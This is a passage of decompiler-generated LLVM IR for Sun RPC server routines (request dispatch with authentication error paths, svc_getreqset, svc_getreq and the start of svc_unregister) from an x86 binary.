  %v0_80637bf.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80637bf

dec_label_pc_806366f.preheader:                   ; preds = %entry
  %v1_8063671 = add i32 %v5_8063664, 8
  %v2_8063671 = inttoptr i32 %v1_8063671 to i32*
  %v3_80636dc = bitcast i32* %stack_var_-896 to i16*
  %v1_806366f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_806366f

dec_label_pc_806366f:                             ; preds = %dec_label_pc_806366f.preheader, %dec_label_pc_80637b8
  %v1_806366f = phi i32 [ %v1_806366f.pre, %dec_label_pc_806366f.preheader ], [ %v1_80637a2, %dec_label_pc_80637b8 ]
  %v0_806366f = phi i32 [ %arg1, %dec_label_pc_806366f.preheader ], [ 0, %dec_label_pc_80637b8 ]
  %v2_806366f = add i32 %v1_806366f, -4
  %v3_806366f = inttoptr i32 %v2_806366f to i32*
  store i32 %v0_806366f, i32* %v3_806366f, align 4
  %v0_8063670 = load i32, i32* %eax.global-to-local, align 4
  %v2_8063670 = add i32 %v1_806366f, -8
  %v3_8063670 = inttoptr i32 %v2_8063670 to i32*
  store i32 %v0_8063670, i32* %v3_8063670, align 4
  %v3_8063671 = load i32, i32* %v2_8063671, align 4
  store i32 %v3_8063671, i32* %eax.global-to-local, align 4
  %v1_8063674 = add i32 %v1_806366f, 1212
  store i32 %v1_8063674, i32* @esi, align 4
  %v2_806367b = add i32 %v1_806366f, -12
  %v3_806367b = inttoptr i32 %v2_806367b to i32*
  store i32 %v1_8063674, i32* %v3_806367b, align 4
  %v2_806367c = add i32 %v1_806366f, -16
  %v3_806367c = inttoptr i32 %v2_806367c to i32*
  store i32 %v5_8063664, i32* %v3_806367c, align 4
  %v1_806367d = add i32 %v1_806366f, -20
  %v2_806367d = inttoptr i32 %v1_806367d to i32*
  store i32 134624895, i32* %v2_806367d, align 4
  %v4_806367d = inttoptr i32 %v3_8063671 to i32*
  %v5_806367d = load i32, i32* %v4_806367d, align 4
  call void @__pseudo_call(i32 %v5_806367d)
  %v0_806367f = load i32, i32* @esp, align 4
  %v1_8063682 = icmp eq i32 %v3_8063671, 0
  br i1 %v1_8063682, label %dec_label_pc_8063798, label %dec_label_pc_806368a

dec_label_pc_806368a:                             ; preds = %dec_label_pc_806366f
  %v1_806368a = add i32 %v0_806367f, 828
  store i32 %v1_806368a, i32* %eax.global-to-local, align 4
  %v1_8063691 = add i32 %v0_806367f, 1288
  store i32 %v1_8063691, i32* %edx.global-to-local, align 4
  %v2_8063698 = add i32 %v0_806367f, 1300
  %v3_8063698 = inttoptr i32 %v2_8063698 to i32*
  store i32 %v1_806368a, i32* %v3_8063698, align 4
  %v0_806369f = load i32, i32* @esp, align 4
  %v1_806369f = add i32 %v0_806369f, 1224
  %v2_806369f = inttoptr i32 %v1_806369f to i32*
  %v3_806369f = load i32, i32* %v2_806369f, align 4
  store i32 %v3_806369f, i32* %eax.global-to-local, align 4
  %v2_80636a6 = add i32 %v0_806369f, 1260
  %v3_80636a6 = inttoptr i32 %v2_80636a6 to i32*
  store i32 %v3_806369f, i32* %v3_80636a6, align 4
  %v0_80636ad = load i32, i32* @esp, align 4
  %v1_80636ad = add i32 %v0_80636ad, 1228
  %v2_80636ad = inttoptr i32 %v1_80636ad to i32*
  %v3_80636ad = load i32, i32* %v2_80636ad, align 4
  store i32 %v3_80636ad, i32* %eax.global-to-local, align 4
  %v2_80636b4 = add i32 %v0_80636ad, 1264
  %v3_80636b4 = inttoptr i32 %v2_80636b4 to i32*
  store i32 %v3_80636ad, i32* %v3_80636b4, align 4
  %v0_80636bb = load i32, i32* @esp, align 4
  %v1_80636bb = add i32 %v0_80636bb, 1232
  %v2_80636bb = inttoptr i32 %v1_80636bb to i32*
  %v3_80636bb = load i32, i32* %v2_80636bb, align 4
  %v2_80636c2 = add i32 %v0_80636bb, 1268
  %v3_80636c2 = inttoptr i32 %v2_80636c2 to i32*
  store i32 %v3_80636bb, i32* %v3_80636c2, align 4
  %v0_80636c9 = load i32, i32* @esp, align 4
  %v1_80636c9 = add i32 %v0_80636c9, 1236
  store i32 %v1_80636c9, i32* %eax.global-to-local, align 4
  %v2_80636d0 = add i32 %v0_80636c9, 1288
  %v3_80636d0 = inttoptr i32 %v2_80636d0 to i32*
  store i32 %v5_8063664, i32* %v3_80636d0, align 4
  %v0_80636d7 = load i32, i32* @edi, align 4
  %v1_80636d7 = load i32, i32* @esp, align 4
  %v2_80636d7 = add i32 %v1_80636d7, -4
  %v3_80636d7 = inttoptr i32 %v2_80636d7 to i32*
  store i32 %v0_80636d7, i32* %v3_80636d7, align 4
  %v1_80636d8 = add i32 %v1_80636d7, -8
  %v2_80636d8 = inttoptr i32 %v1_80636d8 to i32*
  store i32 12, i32* %v2_80636d8, align 4
  %v0_80636da = load i32, i32* %eax.global-to-local, align 4
  %v2_80636da = add i32 %v1_80636d7, -12
  %v3_80636da = inttoptr i32 %v2_80636da to i32*
  store i32 %v0_80636da, i32* %v3_80636da, align 4
  %v0_80636db = load i32, i32* %edx.global-to-local, align 4
  %v2_80636db = add i32 %v1_80636d7, -16
  %v3_80636db = inttoptr i32 %v2_80636db to i32*
  store i32 %v0_80636db, i32* %v3_80636db, align 4
  %v4_80636dc = call i32 @memcpy(i16* %v3_80636dc, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80636dc, i32* %eax.global-to-local, align 4
  %v0_80636e1 = load i32, i32* @esp, align 4
  %v1_80636e4 = add i32 %v0_80636e1, 1252
  %v2_80636e4 = inttoptr i32 %v1_80636e4 to i32*
  %v3_80636e4 = load i32, i32* %v2_80636e4, align 4
  %v4_80636e4 = icmp eq i32 %v3_80636e4, 0
  %v1_80636ec = icmp eq i1 %v4_80636e4, false
  br i1 %v1_80636ec, label %dec_label_pc_806370d, label %dec_label_pc_80636ee

dec_label_pc_80636ee:                             ; preds = %dec_label_pc_806368a
  %v1_80636ee = add i32 %v0_80636e1, 1304
  %v2_80636ee = inttoptr i32 %v1_80636ee to i32*
  %v3_80636ee = load i32, i32* %v2_80636ee, align 4
  store i32 %v3_80636ee, i32* %edx.global-to-local, align 4
  %v0_80636f5 = load i32, i32* @global_var_807e520.853, align 32
  store i32 %v0_80636f5, i32* %eax.global-to-local, align 4
  %v2_80636fa = add i32 %v3_80636ee, 32
  %v3_80636fa = inttoptr i32 %v2_80636fa to i32*
  store i32 %v0_80636f5, i32* %v3_80636fa, align 4
  %v0_80636fd = load i32, i32* @esp, align 4
  %v1_80636fd = add i32 %v0_80636fd, 1288
  %v2_80636fd = inttoptr i32 %v1_80636fd to i32*
  %v3_80636fd = load i32, i32* %v2_80636fd, align 4
  store i32 %v3_80636fd, i32* %eax.global-to-local, align 4
  %v1_8063704 = add i32 %v3_80636fd, 40
  %v2_8063704 = inttoptr i32 %v1_8063704 to i32*
  store i32 0, i32* %v2_8063704, align 4
  br label %dec_label_pc_806372f

dec_label_pc_806370d:                             ; preds = %dec_label_pc_806368a
  %v0_806370d = load i32, i32* @ecx, align 4
  %v2_806370d = add i32 %v0_80636e1, 12
  %v3_806370d = inttoptr i32 %v2_806370d to i32*
  store i32 %v0_806370d, i32* %v3_806370d, align 4
  %v0_806370e = load i32, i32* @ecx, align 4
  %v2_806370e = add i32 %v0_80636e1, 8
  %v3_806370e = inttoptr i32 %v2_806370e to i32*
  store i32 %v0_806370e, i32* %v3_806370e, align 4
  %v0_806370f = load i32, i32* @esi, align 4
  %v2_806370f = add i32 %v0_80636e1, 4
  %v3_806370f = inttoptr i32 %v2_806370f to i32*
  store i32 %v0_806370f, i32* %v3_806370f, align 4
  %v1_8063710 = add i32 %v0_80636e1, 1276
  store i32 %v1_8063710, i32* %eax.global-to-local, align 4
  %v3_8063717 = inttoptr i32 %v0_80636e1 to i32*
  store i32 %v1_8063710, i32* %v3_8063717, align 4
  %v0_8063718 = call i32 @_authenticate()
  store i32 %v0_8063718, i32* %eax.global-to-local, align 4
  %v0_806371d = load i32, i32* @esp, align 4
  %v1_8063720 = icmp eq i32 %v0_8063718, 0
  br i1 %v1_8063720, label %dec_label_pc_806372f, label %dec_label_pc_8063724

dec_label_pc_8063724:                             ; preds = %dec_label_pc_806370d
  %v0_8063724 = load i32, i32* @edx, align 4
  %v2_8063724 = add i32 %v0_806371d, 12
  %v3_8063724 = inttoptr i32 %v2_8063724 to i32*
  store i32 %v0_8063724, i32* %v3_8063724, align 4
  %v0_8063725 = load i32, i32* @edx, align 4
  %v2_8063725 = add i32 %v0_806371d, 8
  %v3_8063725 = inttoptr i32 %v2_8063725 to i32*
  store i32 %v0_8063725, i32* %v3_8063725, align 4
  %v0_8063726 = load i32, i32* %eax.global-to-local, align 4
  %v2_8063726 = add i32 %v0_806371d, 4
  %v3_8063726 = inttoptr i32 %v2_8063726 to i32*
  store i32 %v0_8063726, i32* %v3_8063726, align 4
  %v3_8063727 = inttoptr i32 %v0_806371d to i32*
  store i32 %v5_8063664, i32* %v3_8063727, align 4
  %v2_8063728 = call i32 @svcerr_auth(i32 %v2_8063642, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8063728, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8063795

dec_label_pc_806372f:                             ; preds = %dec_label_pc_806370d, %dec_label_pc_80636ee
  %v0_806372f = load i32, i32* %ebp.global-to-local, align 4
  %v1_806372f = add i32 %v0_806372f, 184
  %v2_806372f = inttoptr i32 %v1_806372f to i32*
  %v3_806372f = load i32, i32* %v2_806372f, align 4
  store i32 %v3_806372f, i32* @edx, align 4
  store i32 -1, i32* @edi, align 4
  store i32 0, i32* @esi, align 4
  store i32 0, i32* @ecx, align 4
  %v1_80637693 = icmp eq i32 %v3_806372f, 0
  %v1_806376b10 = icmp eq i1 %v1_80637693, false
  br i1 %v1_806376b10, label %dec_label_pc_806373e.lr.ph, label %dec_label_pc_806376d.thread

dec_label_pc_806376d.thread:                      ; preds = %dec_label_pc_806372f
  %v0_806378c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_806378c

dec_label_pc_806373e.lr.ph:                       ; preds = %dec_label_pc_806372f
  %v1_8063741.pre = load i32, i32* @esp, align 4
  %v2_8063741 = add i32 %v1_8063741.pre, 1260
  %v3_8063741 = inttoptr i32 %v2_8063741 to i32*
  %v2_806374d = add i32 %v1_8063741.pre, 1264
  %v3_806374d = inttoptr i32 %v2_806374d to i32*
  br label %dec_label_pc_806373e

dec_label_pc_806373e:                             ; preds = %dec_label_pc_806373e.lr.ph, %dec_label_pc_8063767
  %v0_806376d23 = phi i32 [ 0, %dec_label_pc_806373e.lr.ph ], [ %v0_806376d22, %dec_label_pc_8063767 ]
  %v0_806377c = phi i32 [ 0, %dec_label_pc_806373e.lr.ph ], [ %v1_806376120, %dec_label_pc_8063767 ]
  %v0_8063756 = phi i32 [ -1, %dec_label_pc_806373e.lr.ph ], [ %v0_806375617, %dec_label_pc_8063767 ]
  %v0_8063767 = phi i32 [ %v3_806372f, %dec_label_pc_806373e.lr.ph ], [ %v2_8063767, %dec_label_pc_8063767 ]
  %v1_806373e = add i32 %v0_8063767, 4
  %v2_806373e = inttoptr i32 %v1_806373e to i32*
  %v3_806373e = load i32, i32* %v2_806373e, align 4
  store i32 %v3_806373e, i32* %eax.global-to-local, align 4
  %v4_8063741 = load i32, i32* %v3_8063741, align 4
  %v15_8063741 = icmp eq i32 %v3_806373e, %v4_8063741
  %v1_8063748 = icmp eq i1 %v15_8063741, false
  br i1 %v1_8063748, label %dec_label_pc_8063767, label %dec_label_pc_806374a

dec_label_pc_806374a:                             ; preds = %dec_label_pc_806373e
  %v1_806374a = add i32 %v0_8063767, 8
  %v2_806374a = inttoptr i32 %v1_806374a to i32*
  %v3_806374a = load i32, i32* %v2_806374a, align 4
  store i32 %v3_806374a, i32* %eax.global-to-local, align 4
  %v4_806374d = load i32, i32* %v3_806374d, align 4
  %v15_806374d = icmp eq i32 %v3_806374a, %v4_806374d
  br i1 %v15_806374d, label %dec_label_pc_806377c, label %dec_label_pc_8063756

dec_label_pc_8063756:                             ; preds = %dec_label_pc_806374a
  %tmp36 = icmp ugt i32 %v0_8063756, %v3_806374a
  br i1 %tmp36, label %dec_label_pc_806375a, label %dec_label_pc_806375c

dec_label_pc_806375a:                             ; preds = %dec_label_pc_8063756
  store i32 %v3_806374a, i32* @edi, align 4
  br label %dec_label_pc_806375c

dec_label_pc_806375c:                             ; preds = %dec_label_pc_8063756, %dec_label_pc_806375a
  %v0_806375618 = phi i32 [ %v0_8063756, %dec_label_pc_8063756 ], [ %v3_806374a, %dec_label_pc_806375a ]
  store i32 1, i32* @ecx, align 4
  %tmp37 = icmp ugt i32 %v3_806374a, %v0_806377c
  br i1 %tmp37, label %dec_label_pc_8063765, label %dec_label_pc_8063767

dec_label_pc_8063765:                             ; preds = %dec_label_pc_806375c
  store i32 %v3_806374a, i32* @esi, align 4
  br label %dec_label_pc_8063767

dec_label_pc_8063767:                             ; preds = %dec_label_pc_806375c, %dec_label_pc_806373e, %dec_label_pc_8063765
  %v0_8063771 = phi i32 [ %v3_806374a, %dec_label_pc_806375c ], [ %v3_806373e, %dec_label_pc_806373e ], [ %v3_806374a, %dec_label_pc_8063765 ]
  %v1_806376120 = phi i32 [ %v0_806377c, %dec_label_pc_806375c ], [ %v0_806377c, %dec_label_pc_806373e ], [ %v3_806374a, %dec_label_pc_8063765 ]
  %v0_806376d22 = phi i32 [ 1, %dec_label_pc_806375c ], [ %v0_806376d23, %dec_label_pc_806373e ], [ 1, %dec_label_pc_8063765 ]
  %v0_806375617 = phi i32 [ %v0_806375618, %dec_label_pc_806375c ], [ %v0_8063756, %dec_label_pc_806373e ], [ %v0_806375618, %dec_label_pc_8063765 ]
  %v1_8063767 = inttoptr i32 %v0_8063767 to i32*
  %v2_8063767 = load i32, i32* %v1_8063767, align 4
  store i32 %v2_8063767, i32* @edx, align 4
  %v1_8063769 = icmp eq i32 %v2_8063767, 0
  %v1_806376b = icmp eq i1 %v1_8063769, false
  br i1 %v1_806376b, label %dec_label_pc_806373e, label %dec_label_pc_806376d

dec_label_pc_806376d:                             ; preds = %dec_label_pc_8063767
  %v1_806376d = icmp eq i32 %v0_806376d22, 0
  br i1 %v1_806376d, label %dec_label_pc_806378c, label %dec_label_pc_8063771

dec_label_pc_8063771:                             ; preds = %dec_label_pc_806376d
  %v2_8063771 = add i32 %v1_8063741.pre, -4
  %v3_8063771 = inttoptr i32 %v2_8063771 to i32*
  store i32 %v0_8063771, i32* %v3_8063771, align 4
  %v0_8063772 = load i32, i32* @esi, align 4
  %v2_8063772 = add i32 %v1_8063741.pre, -8
  %v3_8063772 = inttoptr i32 %v2_8063772 to i32*
  store i32 %v0_8063772, i32* %v3_8063772, align 4
  %v0_8063773 = load i32, i32* @edi, align 4
  %v2_8063773 = add i32 %v1_8063741.pre, -12
  %v3_8063773 = inttoptr i32 %v2_8063773 to i32*
  store i32 %v0_8063773, i32* %v3_8063773, align 4
  %v2_8063774 = add i32 %v1_8063741.pre, -16
  %v3_8063774 = inttoptr i32 %v2_8063774 to i32*
  store i32 %v5_8063664, i32* %v3_8063774, align 4
  %v0_8063775 = call i32 @svcerr_progvers()
  store i32 %v0_8063775, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8063795

dec_label_pc_806377c:                             ; preds = %dec_label_pc_806374a
  %v2_806377c = add i32 %v1_8063741.pre, -4
  %v3_806377c = inttoptr i32 %v2_806377c to i32*
  store i32 %v0_806377c, i32* %v3_806377c, align 4
  %v0_806377d = load i32, i32* @esi, align 4
  %v2_806377d = add i32 %v1_8063741.pre, -8
  %v3_806377d = inttoptr i32 %v2_806377d to i32*
  store i32 %v0_806377d, i32* %v3_806377d, align 4
  %v2_806377e = add i32 %v1_8063741.pre, -12
  %v3_806377e = inttoptr i32 %v2_806377e to i32*
  store i32 %v5_8063664, i32* %v3_806377e, align 4
  store i32 %v2_8063741, i32* %eax.global-to-local, align 4
  %v2_8063786 = add i32 %v1_8063741.pre, -16
  %v3_8063786 = inttoptr i32 %v2_8063786 to i32*
  store i32 %v2_8063741, i32* %v3_8063786, align 4
  %v1_8063787 = add i32 %v1_8063741.pre, -20
  %v2_8063787 = inttoptr i32 %v1_8063787 to i32*
  store i32 134625162, i32* %v2_8063787, align 4
  %v3_8063787 = load i32, i32* @edx, align 4
  %v4_8063787 = add i32 %v3_8063787, 12
  %v5_8063787 = inttoptr i32 %v4_8063787 to i32*
  %v6_8063787 = load i32, i32* %v5_8063787, align 4
  call void @__pseudo_call(i32 %v6_8063787)
  br label %dec_label_pc_8063795

dec_label_pc_806378c:                             ; preds = %dec_label_pc_806376d.thread, %dec_label_pc_806376d
  %v0_806378c = phi i32 [ %v0_806378c.pre, %dec_label_pc_806376d.thread ], [ %v1_8063741.pre, %dec_label_pc_806376d ]
  %v2_806378f = add i32 %v0_806378c, -16
  %v3_806378f = inttoptr i32 %v2_806378f to i32*
  store i32 %v5_8063664, i32* %v3_806378f, align 4
  %v0_8063790 = call i32 @__GI_svcerr_noprog()
  store i32 %v0_8063790, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8063795

dec_label_pc_8063795:                             ; preds = %dec_label_pc_806377c, %dec_label_pc_8063771, %dec_label_pc_8063724, %dec_label_pc_806378c
  %v0_8063795 = load i32, i32* @esp, align 4
  br label %dec_label_pc_8063798

dec_label_pc_8063798:                             ; preds = %dec_label_pc_806366f, %dec_label_pc_8063795
  %v0_8063798.in = phi i32 [ %v0_806367f, %dec_label_pc_806366f ], [ %v0_8063795, %dec_label_pc_8063795 ]
  %v3_806379b = load i32, i32* %v2_8063671, align 4
  store i32 %v3_806379b, i32* %eax.global-to-local, align 4
  %v3_806379e = inttoptr i32 %v0_8063798.in to i32*
  store i32 %v5_8063664, i32* %v3_806379e, align 4
  %v1_806379f = add i32 %v0_8063798.in, -4
  %v2_806379f = inttoptr i32 %v1_806379f to i32*
  store i32 134625186, i32* %v2_806379f, align 4
  %v4_806379f = add i32 %v3_806379b, 4
  %v5_806379f = inttoptr i32 %v4_806379f to i32*
  %v6_806379f = load i32, i32* %v5_806379f, align 4
  call void @__pseudo_call(i32 %v6_806379f)
  %v0_80637a2 = load i32, i32* @esp, align 4
  %v1_80637a2 = add i32 %v0_80637a2, 16
  %v1_80637a5 = icmp eq i32 %v3_806379b, 0
  %v1_80637a7 = icmp eq i1 %v1_80637a5, false
  br i1 %v1_80637a7, label %dec_label_pc_80637b8, label %dec_label_pc_80637a9

dec_label_pc_80637a9:                             ; preds = %dec_label_pc_8063798
  %v3_80637ac = load i32, i32* %v2_8063671, align 4
  store i32 %v3_80637ac, i32* %eax.global-to-local, align 4
  %v3_80637af = inttoptr i32 %v0_80637a2 to i32*
  store i32 %v5_8063664, i32* %v3_80637af, align 4
  %v1_80637b0 = add i32 %v0_80637a2, -4
  %v2_80637b0 = inttoptr i32 %v1_80637b0 to i32*
  store i32 134625203, i32* %v2_80637b0, align 4
  %v3_80637b0 = load i32, i32* %eax.global-to-local, align 4
  %v4_80637b0 = add i32 %v3_80637b0, 20
  %v5_80637b0 = inttoptr i32 %v4_80637b0 to i32*
  %v6_80637b0 = load i32, i32* %v5_80637b0, align 4
  call void @__pseudo_call(i32 %v6_80637b0)
  %v0_80637b3 = load i32, i32* @esp, align 4
  %v1_80637b3 = add i32 %v0_80637b3, 16
  %v0_80637c9.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80637bf

dec_label_pc_80637b8:                             ; preds = %dec_label_pc_8063798
  %v1_80637b8 = add i32 %v3_806379b, -1
  %v8_80637b8 = icmp eq i32 %v1_80637b8, 0
  store i32 %v1_80637b8, i32* %eax.global-to-local, align 4
  br i1 %v8_80637b8, label %dec_label_pc_806366f, label %dec_label_pc_80637bf

dec_label_pc_80637bf:                             ; preds = %dec_label_pc_80637b8, %entry.dec_label_pc_80637bf_crit_edge, %dec_label_pc_80637a9
  %v0_80637c9 = phi i32 [ %arg1, %entry.dec_label_pc_80637bf_crit_edge ], [ %v0_80637c9.pre, %dec_label_pc_80637a9 ], [ %v1_80637b8, %dec_label_pc_80637b8 ]
  %v0_80637bf = phi i32 [ %v0_80637bf.pre, %entry.dec_label_pc_80637bf_crit_edge ], [ %v1_80637b3, %dec_label_pc_80637a9 ], [ %v1_80637a2, %dec_label_pc_80637b8 ]
  %v1_80637bf = add i32 %v0_80637bf, 1292
  %v6_80637bf = xor i32 %v0_80637bf, -2147483648
  %v7_80637bf = and i32 %v1_80637bf, %v6_80637bf
  %v8_80637bf = icmp slt i32 %v7_80637bf, 0
  store i1 %v8_80637bf, i1* @of, align 1
  %v1_80637c5 = inttoptr i32 %v1_80637bf to i32*
  %v2_80637c5 = load i32, i32* %v1_80637c5, align 4
  store i32 %v2_80637c5, i32* @ebx, align 4
  %v3_80637c5 = add i32 %v0_80637bf, 1296
  %v1_80637c6 = inttoptr i32 %v3_80637c5 to i32*
  %v2_80637c6 = load i32, i32* %v1_80637c6, align 4
  store i32 %v2_80637c6, i32* @esi, align 4
  %v3_80637c6 = add i32 %v0_80637bf, 1300
  %v1_80637c7 = inttoptr i32 %v3_80637c6 to i32*
  %v2_80637c7 = load i32, i32* %v1_80637c7, align 4
  store i32 %v2_80637c7, i32* @edi, align 4
  %v3_80637c7 = add i32 %v0_80637bf, 1304
  %v1_80637c8 = inttoptr i32 %v3_80637c7 to i32*
  %v2_80637c8 = load i32, i32* %v1_80637c8, align 4
  store i32 %v2_80637c8, i32* @ebp, align 4
  ret i32 %v0_80637c9

; uselistorder directives
  uselistorder i32 %v0_80637bf, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_80637b8, { 0, 2, 1 }
  uselistorder i32 %v3_806379b, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8063767, { 1, 2, 0 }
  uselistorder i32 %v3_806374a, { 4, 0, 1, 3, 5, 7, 6, 8, 2, 9 }
  uselistorder i32 %v0_8063756, { 2, 1, 0 }
  uselistorder i32 %v0_806377c, { 0, 3, 2, 1 }
  uselistorder i32 %v2_8063741, { 1, 0, 2 }
  uselistorder i32 %v1_8063741.pre, { 0, 11, 10, 9, 8, 7, 4, 3, 2, 1, 6, 5 }
  uselistorder i32 %v0_806371d, { 3, 0, 1, 2 }
  uselistorder i32 %v0_80636e1, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_806366f, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v5_8063664, { 1, 2, 6, 0, 3, 4, 8, 5, 7, 9, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25 }
  uselistorder i32 -2147483648, { 12, 7, 11, 4, 8, 14, 0, 1, 2, 9, 10, 3, 5, 6, 13 }
  uselistorder i32 (i32, i32)* @svcerr_auth, { 1, 0 }
  uselistorder i32 1304, { 1, 0 }
  uselistorder i32 1300, { 1, 0 }
  uselistorder i32 1288, { 1, 2, 0 }
  uselistorder i32 -20, { 9, 8, 10, 11, 0, 3, 2, 1, 4, 12, 5, 13, 14, 15, 20, 19, 18, 16, 17, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 6, 7, 31, 32, 33 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80637bf, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8063798, { 1, 0 }
  uselistorder label %dec_label_pc_8063795, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_806378c, { 1, 0 }
  uselistorder label %dec_label_pc_8063767, { 2, 0, 1 }
  uselistorder label %dec_label_pc_806375c, { 1, 0 }
  uselistorder label %dec_label_pc_806373e, { 1, 0 }
  uselistorder label %dec_label_pc_806366f, { 1, 0 }
}

define i32 @svc_getreqset(i32* %arg1) local_unnamed_addr {
entry:
  %tmp8 = ptrtoint i32* %arg1 to i32
  %v0_80637cc = load i32, i32* @esi, align 4
  %v0_80637cd = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v2_80637d3 = call i32 @_rpc_dtablesize(i32 %v0_80637cd, i32 %v0_80637cc)
  store i32 %tmp8, i32* @edi, align 4
  %v0_806381a.pre = load i32, i32* @ebp, align 4
  %v5_806381e25 = icmp slt i32 %v0_806381a.pre, %v2_80637d3
  br i1 %v5_806381e25, label %dec_label_pc_80637e2.lr.ph, label %entry.dec_label_pc_8063820_crit_edge

entry.dec_label_pc_8063820_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8063820

dec_label_pc_80637e2.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_80637e2

dec_label_pc_80637e2:                             ; preds = %dec_label_pc_80637e2.lr.ph, %dec_label_pc_8063814
  %v0_80637e226 = phi i32 [ %tmp8, %dec_label_pc_80637e2.lr.ph ], [ %v1_8063814, %dec_label_pc_8063814 ]
  %v1_80637e2 = inttoptr i32 %v0_80637e226 to i32*
  %v2_80637e2 = load i32, i32* %v1_80637e2, align 4
  br label %dec_label_pc_8063802

dec_label_pc_80637e6:                             ; preds = %dec_label_pc_8063802
  %v0_80637e9 = load i32, i32* @ebp, align 4
  %v2_80637e9 = add i32 %v2_8063806, -1
  %v3_80637e9 = add i32 %v2_80637e9, %v0_80637e9
  %v1_80637ee = call i32 @svc_getreq_common(i32 %v3_80637e9)
  %v0_80637f3 = load i32, i32* @ebx, align 4
  %v1_80637f3 = add i32 %v0_80637f3, -1
  %v2_80637fb = urem i32 %v1_80637f3, 32
  %v4_80637fb = icmp eq i32 %v2_80637fb, 0
  br i1 %v4_80637fb, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_80637e6
  %v5_80637fb = shl i32 1, %v2_80637fb
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_80637e6, %bb
  %v1_80637fd = phi i32 [ 1, %dec_label_pc_80637e6 ], [ %v5_80637fb, %bb ]
  %v0_80637fd = load i32, i32* @esi, align 4
  %v2_80637fd = xor i32 %v0_80637fd, %v1_80637fd
  br label %dec_label_pc_8063802

dec_label_pc_8063802:                             ; preds = %dec_label_pc_80637e2, %bb17
  %storemerge = phi i32 [ %v2_80637e2, %dec_label_pc_80637e2 ], [ %v2_80637fd, %bb17 ]
  %v0_8063805 = phi i32 [ %v2_80637e2, %dec_label_pc_80637e2 ], [ %v2_80637fd, %bb17 ]
  store i32 %storemerge, i32* @esi, align 4
  %v1_8063806 = trunc i32 %v0_8063805 to i16
  %v2_8063806 = call i32 @ffs(i16 %v1_8063806)
  store i32 %v2_8063806, i32* @ebx, align 4
  %v1_8063810 = icmp eq i32 %v2_8063806, 0
  %v1_8063812 = icmp eq i1 %v1_8063810, false
  br i1 %v1_8063812, label %dec_label_pc_80637e6, label %dec_label_pc_8063814

dec_label_pc_8063814:                             ; preds = %dec_label_pc_8063802
  %v0_8063814 = load i32, i32* @edi, align 4
  %v1_8063814 = add i32 %v0_8063814, 4
  store i32 %v1_8063814, i32* @edi, align 4
  %v0_8063817 = load i32, i32* @ebp, align 4
  %v1_8063817 = add i32 %v0_8063817, 32
  store i32 %v1_8063817, i32* @ebp, align 4
  %v5_806381e = icmp slt i32 %v1_8063817, %v2_80637d3
  br i1 %v5_806381e, label %dec_label_pc_80637e2, label %dec_label_pc_8063820

dec_label_pc_8063820:                             ; preds = %dec_label_pc_8063814, %entry.dec_label_pc_8063820_crit_edge
  %v0_8063827.lcssa = phi i32 [ %v2_80637d3, %entry.dec_label_pc_8063820_crit_edge ], [ %v2_8063806, %dec_label_pc_8063814 ]
  ret i32 %v0_8063827.lcssa

; uselistorder directives
  uselistorder i32 %v1_8063814, { 1, 0 }
  uselistorder i32 %v2_8063806, { 0, 3, 2, 1 }
  uselistorder i32 %v2_80637fd, { 1, 0 }
  uselistorder i32 %v2_80637fb, { 1, 0 }
  uselistorder i32 %v2_80637e2, { 1, 0 }
  uselistorder i32 %v2_80637d3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8063802, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_80637e2, { 1, 0 }
}

define i32 @__GI_svc_getreq(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-132 = alloca i32, align 4
  %v2_8063836 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8063836, i32* @edx, align 4
  %tmp8 = bitcast i32* %stack_var_-132 to i8*
  store i32 %v2_8063836, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8063841 = call i8* @_memset(i8* %tmp8, i32 0, i32 32)
  store i32 %arg1, i32* %stack_var_-132, align 4
  %v2_8063856 = call i32 @svc_getreqset(i32* nonnull %stack_var_-132)
  ret i32 %v2_8063856

; uselistorder directives
  uselistorder i32* %stack_var_-132, { 0, 2, 1, 3 }
}

define i32 @svc_unregister(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8063863 = load i32, i32* @ebp, align 4
  %v0_8063864 = load i32, i32* @edi, align 4
  %v0_8063865 = load i32, i32* @esi, align 4
  %v0_8063866 = load i32, i32* @ebx, align 4
  store i32 %v0_8063866, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v2_8063872 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8063872, i32* @ecx, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v3_806387a = call i32 @svc_find(i32 %v0_8063866, i32 %v0_8063865, i32 %v0_8063864)
  store i32 %v3_806387a, i32* @ebx, align 4
